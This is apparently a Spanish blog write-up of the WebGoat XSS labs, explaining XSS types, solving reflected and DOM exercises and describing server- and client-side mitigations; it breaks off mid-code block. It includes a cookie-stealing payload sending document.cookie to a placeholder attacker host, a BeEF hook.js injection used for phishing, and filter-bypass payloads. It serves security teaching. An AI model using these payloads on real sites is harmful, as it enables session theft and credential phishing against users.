<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="WebGoat - A7 - (XSS) Cross Site Scripting" /><meta name="author" content="Christian Gutierrez" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introducción En esta ocasión vamos a trabajar con un laboratorio de Cross Site Scripting (XSS), en el que nos aprovecharemos de distintas funcionalidades que no realizan un correcto saneamiento de los datos de entrada y salida, permitiendo que se incluya código JavaScript en una sesión de usuario." /><meta property="og:description" content="Introducción En esta ocasión vamos a trabajar con un laboratorio de Cross Site Scripting (XSS), en el que nos aprovecharemos de distintas funcionalidades que no realizan un correcto saneamiento de los datos de entrada y salida, permitiendo que se incluya código JavaScript en una sesión de usuario." /><link rel="canonical" href="https://csl-labs.github.io/posts/webgoat-a7-xss/" /><meta property="og:url" content="https://csl-labs.github.io/posts/webgoat-a7-xss/" /><meta property="og:site_name" content="CSL" /><meta property="og:image" content="https://csl-labs.github.io/assets/webgoat/A7/portada.PNG" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-01T14:10:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://csl-labs.github.io/assets/webgoat/A7/portada.PNG" /><meta property="twitter:title" content="WebGoat - A7 - (XSS) Cross Site Scripting" /><meta name="twitter:site" content="@CsLcol" /><meta name="twitter:creator" content="@Christian Gutierrez" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"image":"https://csl-labs.github.io/assets/webgoat/A7/portada.PNG","description":"Introducción En esta ocasión vamos a trabajar con un laboratorio de Cross Site Scripting (XSS), en el que nos aprovecharemos de distintas funcionalidades que no realizan un correcto saneamiento de los datos de entrada y salida, permitiendo que se incluya código JavaScript en una sesión de usuario.","mainEntityOfPage":{"@type":"WebPage","@id":"https://csl-labs.github.io/posts/webgoat-a7-xss/"},"@type":"BlogPosting","url":"https://csl-labs.github.io/posts/webgoat-a7-xss/","headline":"WebGoat - A7 - (XSS) Cross Site Scripting","dateModified":"2021-03-01T14:10:00-05:00","datePublished":"2021-03-01T14:10:00-05:00","author":{"@type":"Person","name":"Christian Gutierrez"},"@context":"https://schema.org"}</script><title>WebGoat - A7 - (XSS) Cross Site Scripting | CSL</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/base/logoCSL.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">CSL</a></div><div class="site-subtitle font-italic">WriteUps, HackTheBox, CTF's, CheatSheet, Wargames & more...</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>NOSOTROS</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/csl-labs" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/CsLcol" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['csl','csl.com.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Publicaciones </a> </span> <span>WebGoat - A7 - (XSS) Cross Site Scripting</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Buscador..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>WebGoat - A7 - (XSS) Cross Site Scripting</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Mar 1, 2021, 2:10 PM -0500" > Mar 1 <i class="unloaded">2021-03-01T14:10:00-05:00</i> </span> by <span class="author"> Christian Gutierrez </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/portada.PNG" class="post-preview-img"><h2 id="introducción">Introducción</h2><p>En esta ocasión vamos a trabajar con un laboratorio de <strong>Cross Site Scripting</strong> (<strong>XSS</strong>), en el que nos aprovecharemos de distintas funcionalidades que no realizan un correcto saneamiento de los datos de entrada y salida, permitiendo que se incluya código JavaScript en una sesión de usuario.</p><h2 id="xss">XSS</h2><p>De forma general podemos definir el <strong>XSS</strong> como una vulnerabilidad de inyección, pero que al darse en un ambiente de cliente/browser ha sido catalogada de forma independiente en el <a href="https://owasp.org/www-community/attacks/xss/">OWASP</a>, debido a que su objetivo de explotación no esta dado por el servidor sino por el visitante, además de requerir comúmenteun segundo paso apoyado en la ingenieria social, para llegar a una posible victima.</p><p>Los 3 tipos de <strong>XSS</strong> principales son:</p><ol><li><strong>Reflejado</strong> El contenido malicioso únicamente se ejecuta en el contexto del browser de la victima. Usualmente con un payload comuflado e includio en la URL; se aprovehca de un mal saneamiento de datos de lado del servidor.<li><strong>Almacenado</strong> El contenido malicioso se almacena en las bases de datos, haciendolo persistente. El payload es ejecutado en cada llamada de forma organiza que realiza el aplicativo, por ejemplo un sistema de comentarios.<li><strong>DOM</strong> Es similar al reflejado ya que su ejecución se realiza en el contexto del browser y el payload se inyecta por URL, no obstante, explota debilidades de saneamiento en funciones <strong>JavaScript</strong> que permiten la manipulación del <strong>DOM</strong>.</ol><h2 id="riesgos-de-seguridad">Riesgos de seguridad</h2><p>Aunque algo subestimados, los riesgos de seguridad asociados al <strong>XSS</strong> son tan variados y criticos como lo imagine un atacante, esto básicamente por que se trata de una inyección de código JavaScript, y recordemos que este es un lenguaje de programación robusto, con el que podemos crear todo tipo de interacciones cliente-servidor, así que realmente <strong>NO</strong> se esta limitado cuando se trata de explotar un <strong>XSS</strong>.</p><h3 id="robo-de-sesiones"><strong>Robo de sesiones</strong></h3><p>Quizás el truco más simple y común sea el robo de sesiones. Tengamos presente que si las cookies del aplicativo web no tienen el atributo <strong>HTTPOnly</strong> habilitado, vamos a poder accederlas por medio de <strong>document.cookie</strong> y la forma de envio a un tercer servidor, puede ser tan simple como incluirlo en una petición get de una imagen, como el siguiente ejemplo:</p><p>Se inyecta el siguiente payload.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://[ATTACK]/bogus.php?session=</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><p>El navegador, al interpretar el código <strong>JS</strong>, intenta realizar una conexión a este origen de imagen concatenandole la <strong>COOKIE</strong> de la victima:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/01_robo_cookie.png" alt="Robo" /> <em>Robo de Cookie</em></p><p>De forma paralela, el atacante esta a la espera de una conexión a dicho servicio <code class="language-plaintext highlighter-rouge">bogus.php</code> y es allí donde captura la <strong>cookie</strong> de la victima:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/02_captura_cookie.png" alt="Captura" /> <em>Captura de la Cookie</em></p><p>Este es un ejemplo simple de una de las muchas maneras en que se puede capturar la Cookie, explotando un <strong>XSS</strong>.</p><h3 id="enumeración-de-activos-internos"><strong>Enumeración de Activos Internos</strong>:</h3><p>De forma similar, un atacante puede inyectar un código JS que realice conexiones a múltiples IP’s internas de la red. Recordemos que al ejecutarse en el contexto del cliente (su browser), todas las acciones tendrán como origen la IP o el equipo del cliente, y si este se encuentra en una red privada es posible intentar conectarnos a otros servidores u otros puertos locales (sí, lo sé… las posibilidades son infinitas).</p><ul><li><a href="http://jsscan.sourceforge.net/jsscan2.html">Escaneo de Puertos e IPs - JS</a> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/03_scanner_ports.PNG" alt="Escaneo de Puertos" /> <em>Escaner en JavaScript</em></ul><p>Esta herramienta es un excelente ejemplo de lo que se puede realizar y como al capturar los errores de la carga de una imagen, es posible definir si un puerto se encuentra abierto, además de poder definir el protocolo para realizar acciones similares a un <strong>ping</strong>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/04_ping.PNG" alt="ping" /> <em>Ping en JavaScript</em></p><h3 id="ataques-de-ingeniería-social"><strong>Ataques de Ingeniería Social</strong></h3><p>Existen muchas otras formas de aprovechar la ejecución de código <strong>JavaScript</strong> en el navegador del cliente, y entre las más interesantes se encuentran aquellas funciones que sirven de apoyo para un ataque de ingeniería social, basandonos en el hecho de que con JS tenemos control completo sobre el DOM de lo que visualiza la victima, por lo que podemos alterarlo y agregar, quitar o simular otras funcionalidades.</p><ul><li><a href="https://beefproject.com/">BeEF - The Browser Exploitation Framework Project</a></ul><p>Este grandioso framework tiene un funcionamiento muy interesante que nos permite convertir nuestro <strong>XSS</strong> en un entorno de <strong>Command And Control</strong>, en el que nuestro servidor principal puede controlar y emitir acciones hacia las victimas (zombies/esclavos) en tiempo real, permitiendo realizar cambios visuales que estimulen a la victima a descargar software malicioso, ingresar datos en paneles de acceso, instalar plugins en el navegador, lanzar enumeraciones y lograr recopilar información de la victima (vale la pena poder revisarlo).</p><p>Para enlazar el funcionamiento del <strong>BeEF</strong> a nuestro <strong>XSS</strong>, debemos inyectar un payload que haga uso del <code class="language-plaintext highlighter-rouge">hook.js</code> especialmente diseñado por el framework, el cual realiza una conexión recurrente al servidor central en busca de acciones a ejecutar, o la forma de enviar algún resultado previo.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://[attack]/hook.js</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>También es posible subir completamente el servicio de <strong>BeEF</strong> y hacer uso de su laboratorio demo, el cual ya incluye el <code class="language-plaintext highlighter-rouge">hook.js</code>.</p><ul><li><code class="language-plaintext highlighter-rouge">http://[ATTACK]:3000/demos/butcher/index.html</code></ul><p>Se tiene un dashboard donde se listan todos las victimas conectadas a nuestro sitio malicioso o que hicieron click en el enlace que explota el <strong>XSS</strong>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/05_beef_project.png" alt="Command And Control" /> <em>Command and Control</em></p><p>Luego, se puede considerar cada victima por separado y seleccionar alguna acción (de las predefinidas), e intentar suplantar un panel de autenticación de facebook o de google:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/06_beef_facebook.png" alt="Ejecución Phishing Facebook" /> <em>Ejecución Phishing Facebook</em></p><p>Este tipo de técnicas le permiten a un atacante aprovechar la distracción de una victima que no se percata en qué momento abrio un enlace o por qué se encuentra en un formulario de acceso, de un servicio distinto al que ingreso. Además de poder personalizar los payload y crear vistas que hagan referencia al servicio vulnerable a <strong>XSS</strong>.</p><h2 id="laboratorios">Laboratorios</h2><h3 id="xss---7">XSS - 7</h3><p>Se inicia con un sistema de carrito de compras:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/07_carrito_compras.png" alt="Carrito de Compras" /> <em>Carrito de Compras</em></p><p>Se detecta que el parámetro <strong>“Enter your credit card number”</strong>, se retorna como parte de la respuesta dada por el aplicativo, en cada activación del botón <strong>“Purchase”</strong>. El valor ingresado es concatenado a una respuesta generica que se muestra por pantalla y que hace uso del parametro <code class="language-plaintext highlighter-rouge">field1</code> via <strong>GET</strong>.</p><ul><li>/CrossSiteScripting/attack5a?QTY1=1&amp;QTY2=1&amp;QTY3=1&amp;QTY4=1&amp;<strong>field1=4128 3214 0002 1999</strong>&amp;field2=111 <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/08_xss_reflejado.png" alt="Respuesta reflejada" /> <em>Respuesta Reflejada</em></ul><p>Al tener este comportamiento, se puede inyectar código <strong>JS</strong> dentro de las etiquetas <strong>html</strong>, logrando así que al momento de reflejar la respuesta, el navegador tome nuestro código inyectado como parte valida del aplicativo y lo renderice e interprete.</p><ul><li><code class="language-plaintext highlighter-rouge">&lt;script&gt;alert(0);&lt;/script&gt;</code> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/09_xss_alert.png" alt="Alert XSS" /> <em>Alert XSS</em></ul><p>Es un escenario básico de explotación de <strong>XSS</strong>, así que verificaquemos a nivel de código cómo se produce esta vulnerabilidad y cómo se puede mitigar.</p><h4 id="mitigación">Mitigación</h4><p>El archivo donde se encuentra la vulnerabilidad es:</p><ul><li><code class="language-plaintext highlighter-rouge">\webgoat-lessons\cross-site-scripting\src\main\java\org\owasp\webgoat\xss\CrossSiteScriptingLesson5a.java</code></ul><p>Y se evidencia que el parámetro <code class="language-plaintext highlighter-rouge">field1</code> es concatenado de forma directa a la respuesta genérica de la funcionalidad, sin realizar previamente un saneamiento o un filtrado de los parámetros dañinos, lo que produce la vulnerabilidad.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/10_codigo_field1.png" alt="Código Vulnerable" /> <em>Código Vulnerable</em></p><p>Es por esto que al incluir payloads con etiquetas <strong>html</strong> y código <strong>JS</strong>, el navegador lo interpretaba como si hiciera parte valida del aplicativo.</p><p>La mitigación de esta vulnerabilidad consiste en realizar un proceso previo de filtrado y saneamiento del parámetro <code class="language-plaintext highlighter-rouge">field1</code> antes de incluir lo en la respuesta. Esto se puede realizar usando la librería <code class="language-plaintext highlighter-rouge">org.owasp.encoder.Encode.forHtml()</code> para <strong>Java</strong>, lo que permite cambiar la códificación de salida en <a href="https://www.w3schools.com/html/html_entities.asp">HTML Entitys</a>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/11_codigo_mitigacion.png" alt="Código Mitigado" /> <em>Código Mitigado</em></p><p>De esta manera tenemos una mitigación robusta sobre esta funcionalidad vulnerable, no obstante, se deben tener en cuenta el por qué no esta bien utilizar mitigaciones triviales como las siguientes.</p><ul><li><strong>¿Y si elimino todos los <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>?</strong> Esta es la forma más “común” e insegura de mitigar vulnerabilidades que se dan por mal saneamiento de datos, ya que se intenta atacar directamente el payload y no el significado. Pongamos un ejemplo:</ul><blockquote><p>El desarrollador deduce que la vulnerabilidad real esta en permitir la etiqueta <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> ya que por medio de esta es que se ejecuta el código <strong>JS</strong>. Basado en esto, considera que la forma más eficiente de mitigar es realizando un replace sobre dicha expresión.</p></blockquote><p>En general esta situación es muy común y aunque parece una posible solución, su debilidad se fundamenta en el uso de una <code class="language-plaintext highlighter-rouge">Lista Negra</code> de expresiones, extensiones o etiquetas que considera no se deben permitir, sin embargo, el uso de ```Listas Negras`` nos obliga a considerar todos los escenarios y posibles formas del contenido dañino.</p><p>¿Me explico?, se cree que la única etiqueta dañina es la de <code class="language-plaintext highlighter-rouge">script</code>, pero este mismo comportamiento lo podemos lograr con <code class="language-plaintext highlighter-rouge">img</code>, <code class="language-plaintext highlighter-rouge">body</code>, <code class="language-plaintext highlighter-rouge">iframe</code>, y muchas otras etiquetas que posiblemente el desarrollador no considere, dejando persistente la vulnerabilidad.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/12_codigo_replace.png" alt="Mitigación con Replace" /> <em>Mitigación con Replace</em></p><p>Aunque la vulnerabilidad parece mitagada a nivel de código, ¿Qué sucede si inyectamos estos payloads?:</p><ul><li><code class="language-plaintext highlighter-rouge">&lt;ScRiPt&gt;alert(0)&lt;/ScRiPt&gt;</code><ul><li>Con una variación simple, se rompe la validación y busqueda de <strong>script</strong>.</ul><li><code class="language-plaintext highlighter-rouge">&lt;img src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/img&gt;</code><ul><li>Existen otras etiquetas dañinas.</ul><li><code class="language-plaintext highlighter-rouge">&lt;embed src="javascript:alert(1)"&gt;</code><li>Etc.. <a href="https://github.com/payloadbox/xss-payload-list">Aquí podemos consultar muchos más payloads</a></ul><p>Otro caso sería si se realiza una <code class="language-plaintext highlighter-rouge">Lista Blanca</code>, en la que con una expresión regular se valida que únicamente se acepten caracteres pertencientes al abecedario; <strong>pero eso queda de tarea :)</strong>.</p><h3 id="xss---10---11">XSS - 10 - 11</h3><p>Este es otro laboratorio básico en el que se debe explotar un <strong>XSS - DOM</strong>, el cual como nos indica la descripción del ejercicio, se encuentra en una funcionalidad routes a nivel del código JavaScript del aplciativo, por lo que procedemos a su busqueda.</p><ul><li>Vamos a al <strong>depurador</strong> de la herramienta de desarrollo de nuestro navegador.<li>Tecleamos <code class="language-plaintext highlighter-rouge">Ctrl + Shift + F</code> lo cual nos permite buscar en todos los archivos <strong>JS</strong>.<li>Buscamos por el termino <strong>route</strong>.</ul><p>Identificamos el archivo donde se encuentran las routes que se manejan desde <strong>JS</strong>:</p><ul><li><code class="language-plaintext highlighter-rouge">/WebGoat/js/goatApp/view/GoatRouter.js</code></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/13_dom_routes.png" alt="Identificación de las Routes" /> <em>Identificación de las Routes</em></p><p>Como se puede observar, existe una route llamada <code class="language-plaintext highlighter-rouge">test/:param</code>, la cual recibe un parametro y luego activa la función <code class="language-plaintext highlighter-rouge">testRoute</code>, donde dicha función realiza un llamado a la vista <code class="language-plaintext highlighter-rouge">showTestParam</code>.</p><ul><li><code class="language-plaintext highlighter-rouge">/WebGoat/js/goatApp/view/LessonContentView.js</code> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/14_dom_showTestParam.png" alt="Función showTestParam" /> <em>Función showTestParam</em></ul><p>Una vez en este punto, se identifica que el <code class="language-plaintext highlighter-rouge">:param</code> es concatenado en una vista junto con <code class="language-plaintext highlighter-rouge">"test:" + param</code>, lo que nos indica que la forma de inyectar nuestro payload para explotar el <strong>XSS</strong>, es accediendo a la siguiente <strong>URL</strong>:</p><ul><li>/WebGoat/start.mvc#test/<strong>devsec</strong><ul><li>Donde <code class="language-plaintext highlighter-rouge">#test/</code> es la route a la que llamamos.<li>Y <strong>devsec</strong> es el valor que inyectamos.</ul></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/15_dom_devsec.png" alt="Parametro Inyectable" /> <em>Parametro Inyectable</em></p><p>Si se intenta inyectar un payload xss directamente en el parametro identificado, veremos que este no se interpreta de forma adecuada en nuestro navegador, por lo que debemos aplicar una conversión y posteriormente inyectar el payload.</p><ul><li>Payload: <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert(0)&lt;/script&gt;</code><li>Payload Encode URL: <code class="language-plaintext highlighter-rouge">%3Cscript%3Ealert%280%29%3C%2Fscript%3E</code><li>URL Inyección: /WebGoat/start.mvc#test/<code class="language-plaintext highlighter-rouge">%3Cscript%3Ealert%280%29%3C%2Fscript%3E</code></ul><p>Ahora, según nos indica el reto se debe hacer un llamado a la funcionalidad <code class="language-plaintext highlighter-rouge">webgoat.customjs.phoneHome()</code> la cual nos da un número aleatorio que será nuestra respuesta:</p><ul><li>Payload: <code class="language-plaintext highlighter-rouge">&lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;</code><li>Payload Encoded URL: <code class="language-plaintext highlighter-rouge">%3Cscript%3Ewebgoat%2Ecustomjs%2EphoneHome%28%29%3C%2Fscript%3E</code><li>URL: /WebGoat/start.mvc#test/<code class="language-plaintext highlighter-rouge">%3Cscript%3Ewebgoat%2Ecustomjs%2EphoneHome%28%29%3C%2Fscript%3E</code></ul><p>Hacemos la busqueda del número en nuestra consola del navegador, aunque también se puede visualizar por medio de un <code class="language-plaintext highlighter-rouge">alert()</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A7/16_dom_answer.png" alt="Respuesta XSS-DOM" /> <em>Respuesta XSS-DOM</em></p><h4 id="mitigación-1">Mitigación</h4><p>Para este ejercicio tenemos 2 alternativas de mitigación:</p><ol><li>Como nos indica el reto, esta vulnerabilidad se da debido a la conservación de distintas funcionalidades de pruebas; por lo que la forma de mitigación sería depurando dicho endpoint del route.<li>Podemos hacer uso de la librería <strong>ESAPI</strong> de <strong>OWASP</strong>, la cual posee distintas funcionalidades para el saneamiento de datos<ul><li><a href="https://github.com/ESAPI/owasp-esapi-js">OWASP-ESAPI-JS</a></ul></ol><p>En caso de que queramos conservar el <strong>route</strong> vulnerable, debemos realizar una validación y filtrado antes de concatenar y mostrar el parametro al cliente, todo con la librería <strong>ESAPI</strong> de <strong>OWASP</strong>:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
